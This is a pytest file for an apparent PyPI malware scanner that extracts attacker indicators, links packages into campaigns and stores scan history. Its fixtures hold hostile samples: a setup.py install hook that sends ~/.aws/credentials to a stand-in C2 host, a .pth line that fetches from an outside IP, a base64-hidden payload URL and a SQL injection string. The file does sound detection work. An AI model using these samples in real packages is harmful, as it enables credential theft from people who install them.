import base64
import sqlite3

import pytest

from pkgsentry import cli
from pkgsentry.analyzers.rules import Finding
from pkgsentry.campaigns import extract_indicators, indicators_in_text, link, url_key
from pkgsentry.fetch.extract import ExtractionReport
from pkgsentry.models import PackageInfo, ReleaseFile
from pkgsentry.storage import load_scans, save_scan


@pytest.mark.parametrize("url, key", [
    ("https://fixars.top/payload", "host fixars.top"),
    ("https://C2.Evil.example./collect", "host c2.evil.example"),
    ("http://203.0.113.5:8080/upload", "IP 203.0.113.5"),
    ("https://discord.com/api/webhooks/1499336276/secret-token", "Discord webhook 1499336276"),
    ("https://canary.discord.com/api/webhooks/42/x", "Discord webhook 42"),
    ("https://cdn.discordapp.com/attachments/111/222/stage2.exe", "Discord channel 111"),
    ("https://api.telegram.org/bot123456:AAE-secret/sendMessage", "Telegram bot 123456"),
    ("https://pastebin.com/raw/yBcUM1QB", "Pastebin paste yBcUM1QB"),
    ("https://webhook.site/0fb8a38d-80f7-4134-8eb4-0123456789ab", "webhook.site token 0fb8a38d-80f7-4134-8eb4-0123456789ab"),
    ("https://raw.githubusercontent.com/attacker1/tools/main/x.py", "GitHub user attacker1"),
    ("https://github.com/attacker1/tools/releases/download/v1/x.exe", "GitHub user attacker1"),
    ("https://evil-bucket.s3.amazonaws.com/x", "host evil-bucket.s3.amazonaws.com"),
    ("https://s3.amazonaws.com/evil-bucket/x", "cloud bucket evil-bucket"),
    ("https://store-eu-par-12.gofile.io/download/web/a2a60e90-dea4/x", "shared file a2a60e90-dea4"),
    # Shared services and public utilities: kept for the analyst, never used to link packages.
    ("https://github.com/psf/requests", ""),
    ("https://www.gnu.org/licenses/gpl-3.0.html", ""),
    ("https://sourceforge.net/projects/ruamel-yaml/", ""),
    ("https://discord.com/invite/abc", ""),
    ("https://api.ipify.org?format=json", ""),
    ("https://pypi.org/simple/", ""),
    ("http://8.8.8.8/", ""),
    # Not an outside address at all.
    ("http://127.0.0.1:5000/collect", None),
    ("http://169.254.169.254/latest/meta-data/", None),
    ("http://metadata.google.internal/computeMetadata/v1/", None),
    ("http://localhost:8000/", None),
    ("http://[::1]/", None),
])
def test_only_attacker_specific_indicators_link(url, key):
    assert url_key(url) == key


def test_bare_ip_strings_and_urls_inside_text():
    assert indicators_in_text("45.151.62.119:443") == [("ip", "45.151.62.119", "IP 45.151.62.119")]
    assert indicators_in_text("10.0.0.7") == []
    assert indicators_in_text("see https://evil.example/a, then (https://pypi.org)") == [
        ("url", "https://evil.example/a", "host evil.example"), ("url", "https://pypi.org", "")]


def write(root, name, text):
    path = root / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


def flagged(path, strength="medium"):
    return Finding("network", path, 1, "install", strength, "uses the network", "")


def test_indicators_come_from_flagged_code_including_base64(tmp_path):
    hidden = base64.b64encode(b"https://stage2.evil.example/p.py").decode()
    write(tmp_path, "demo-1.0/setup.py", f'''\
"""Docs live at https://docs.honest.example/guide."""
import base64, urllib.request
C2 = "https://c2.evil.example/collect"
STAGE = base64.b64decode("{hidden}")
LOCAL = "http://127.0.0.1:8000/"
HOME = "https://github.com/demo/demo"
urllib.request.urlopen(C2)
''')
    write(tmp_path, "demo-1.0/demo/quiet.py", 'URL = "https://other.example/x"\n')
    found = extract_indicators(tmp_path, [flagged("demo-1.0/setup.py"), flagged("demo-1.0/demo/quiet.py", "info")])
    assert [(i.value, i.key, i.line, i.hidden) for i in found] == [
        ("https://c2.evil.example/collect", "host c2.evil.example", 3, False),
        ("https://stage2.evil.example/p.py", "host stage2.evil.example", 4, True),
        ("https://github.com/demo/demo", "", 6, False),
    ]


def test_pth_lines_are_read_like_site_py(tmp_path):
    write(tmp_path, "evil.pth", "\ufeffimport urllib.request; urllib.request.urlopen('http://198.51.100.7/x')\n")
    [indicator] = extract_indicators(tmp_path, [flagged("evil.pth")])
    assert (indicator.key, indicator.line) == ("IP 198.51.100.7", 1)


def test_linking_follows_chains_and_ignores_shared_services():
    campaigns = link({
        "pkg-a": {"host c2.evil.example", ""},
        "pkg-b": {"host c2.evil.example", "Discord webhook 42"},
        "pkg-c": {"Discord webhook 42"},
        "honest-1": {""},
        "honest-2": {""},
        "alone": {"host other.example"},
    })
    assert [(c.packages, c.links) for c in campaigns] == [(
        ("pkg-a", "pkg-b", "pkg-c"),
        (("Discord webhook 42", ("pkg-b", "pkg-c")), ("host c2.evil.example", ("pkg-a", "pkg-b"))),
    )]
    # The bridge is seen last: a naive "point c at b" would cut a off from the group.
    assert [c.packages for c in link({"a": {"k1"}, "b": {"k2"}, "c": {"k1", "k2"}})] == [("a", "b", "c")]


def test_storage_keeps_attacker_text_as_data(tmp_path):
    db = tmp_path / "scans.db"
    evil = "x'); DROP TABLE scans; --"
    indicators = indicators_for(tmp_path)
    save_scan(db, evil, "1.0", "sdist", "ab" * 32, 92, "critical", indicators)
    save_scan(db, evil, "1.0", "sdist", "ab" * 32, 90, "critical", indicators)  # a rescan replaces the old row
    [scan] = load_scans(db)
    assert (scan.package, scan.score, [i.key for i in scan.indicators]) == (evil, 90, ["host c2.evil.example"])
    with sqlite3.connect(db) as connection:
        assert connection.execute("SELECT COUNT(*) FROM scans").fetchone() == (1,)


def indicators_for(tmp_path):
    write(tmp_path, "pkg/setup.py", 'URL = "https://c2.evil.example/collect"\n')
    return extract_indicators(tmp_path, [flagged("pkg/setup.py")])


def fake_scan(tmp_path, monkeypatch, name, url):
    root = tmp_path / name
    write(root, f"{name}-1.0/setup.py", f'''\
import os, urllib.request
from setuptools import setup
from setuptools.command.install import install

class Steal(install):
    def run(self):
        urllib.request.urlopen("{url}", open(os.path.expanduser("~/.aws/credentials")).read().encode())

setup(name="{name}", cmdclass={{"install": Steal}})
''')
    package = PackageInfo(name, "1.0", "", "", "", "", 0, 1, None, ())
    file = ReleaseFile(f"{name}-1.0.tar.gz", "sdist", "https://files.pythonhosted.org/x", 100, "ab" * 32, None)
    extraction = ExtractionReport(root=root, files=[f"{name}-1.0/setup.py"], bytes_written=100)
    monkeypatch.setattr(cli, "_fetch", lambda args: (package, file, tmp_path / file.filename, extraction))


def test_scans_saved_on_different_days_are_linked(tmp_path, monkeypatch, capsys):
    db = tmp_path / "history.db"
    fake_scan(tmp_path, monkeypatch, "reqeusts", "https://c2.evil.example/collect")
    assert cli.main(["scan", "reqeusts", "--db", str(db)]) == 0
    first = capsys.readouterr().out
    assert "hxxps://c2[.]evil[.]example/collect" in first and "links by host c2[.]evil[.]example" in first
    assert "Links       none" in first
    fake_scan(tmp_path, monkeypatch, "colorama-x", "https://c2.evil.example/v2")
    assert cli.main(["scan", "colorama-x", "--db", str(db)]) == 0
    second = capsys.readouterr().out
    assert "host c2[.]evil[.]example  ->  reqeusts 1.0 (CRITICAL)" in second
    assert cli.main(["campaigns", "--db", str(db)]) == 0
    report = capsys.readouterr().out
    assert "Group 1  2 packages, highest level CRITICAL" in report
    assert "shares host c2[.]evil[.]example: colorama-x, reqeusts" in report
    assert "evil.example" not in first + second + report


def test_campaigns_needs_an_existing_history(tmp_path, capsys):
    assert cli.main(["campaigns", "--db", str(tmp_path / "missing.db")]) == 1
    assert "no scan history" in capsys.readouterr().err
    assert not (tmp_path / "missing.db").exists()
